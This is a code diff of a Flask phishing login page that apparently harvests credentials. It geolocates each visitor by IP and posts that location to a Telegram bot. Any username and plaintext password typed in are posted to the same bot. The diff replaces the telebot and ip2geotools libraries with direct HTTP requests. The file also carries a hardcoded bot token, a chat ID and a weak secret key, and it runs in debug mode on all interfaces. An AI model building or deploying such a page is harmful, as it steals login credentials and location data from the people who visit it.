@@ -1,7 +1,6 @@
-from flask import Flask, request, redirect, url_for, render_template_string, flash
-import telebot
+from flask import Flask, request, render_template_string, flash
 import requests
-from ip2geotools.databases.noncommercial import DbIpCity
+import json
 
 app = Flask(__name__)
 app.secret_key = 'secret123'  # Needed for flashing messages
@@ -9,30 +8,25 @@ app.secret_key = 'secret123'  # Needed for flashing messages
 # Telegram Bot Configuration
 BOT_TOKEN = '8096386157:AAEkHHt2QYnB_s83puOfrl2xPZZ1FKtVqDw'
 ADMIN_CHAT_ID = '6420116837'
-bot = telebot.TeleBot(BOT_TOKEN)
 
 # Dummy credentials for login check
 VALID_USERNAME = "admin"
 VALID_PASSWORD = "admin123"
 
-# Function to get user details
+# Function to get user details (simplified version without ip2geotools)
 def get_user_details(ip):
     try:
         if ip == '127.0.0.1':
             ip = requests.get('https://api.ipify.org').text
         
-        response = DbIpCity.get(ip, api_key='free')
-        city = response.city
-        country = response.country
-        region = response.region
-        latitude = response.latitude
-        longitude = response.longitude
+        # Using free IP API instead of ip2geotools
+        response = requests.get(f'http://ip-api.com/json/{ip}').json()
         return {
             'ip': ip,
-            'city': city,
-            'country': country,
-            'region': region,
-            'coordinates': f"{latitude}, {longitude}"
+            'city': response.get('city', 'Unknown'),
+            'country': response.get('country', 'Unknown'),
+            'region': response.get('regionName', 'Unknown'),
+            'coordinates': f"{response.get('lat', 'Unknown')}, {response.get('lon', 'Unknown')}"
         }
     except:
         return {
@@ -43,14 +37,20 @@ def get_user_details(ip):
             'coordinates': 'Unknown'
         }
 
-# Function to send message to Telegram
+# Function to send message to Telegram (simplified version without telebot)
 def send_telegram_message(message):
     try:
-        bot.send_message(ADMIN_CHAT_ID, message)
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data = {
+            "chat_id": ADMIN_CHAT_ID,
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        requests.post(url, data=data)
     except Exception as e:
         print(f"Error sending Telegram message: {e}")
 
-# --- HTML + CSS Template ---
+# HTML + CSS Template (same as before)
 login_page = """
 <!DOCTYPE html>
 <html lang="en">
@@ -162,7 +162,6 @@ login_page = """
 </html>
 """
 
-# --- Flask Routes ---
 @app.route("/", methods=["GET", "POST"])
 def login():
     # Get user IP and details
@@ -176,11 +175,11 @@ def login():
     # Send initial access info to Telegram
     access_message = f"""
 🚨 New Page Access 🚨
-    
+
 📌 IP: {user_details['ip']}
 🌍 Location: {user_details['city']}, {user_details['region']}, {user_details['country']}
 📍 Coordinates: {user_details['coordinates']}
-    
+
 🖥️ User Agent: {user_agent}
 🔗 Referrer: {referrer}
 """
@@ -193,14 +192,14 @@ def login():
         # Send login attempt to Telegram
         login_message = f"""
 🔐 Login Attempt 🔐
-    
+
 👤 Username: {username}
 🔑 Password: {password}
-    
+
 📌 IP: {user_details['ip']}
 🌍 Location: {user_details['city']}, {user_details['region']}, {user_details['country']}
 📍 Coordinates: {user_details['coordinates']}
-    
+
 🖥️ User Agent: {user_agent}
 """
         send_telegram_message(login_message)
@@ -212,6 +211,5 @@ def login():
 
     return render_template_string(login_page)
 
-# --- Run Server ---
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=5000, debug=True)
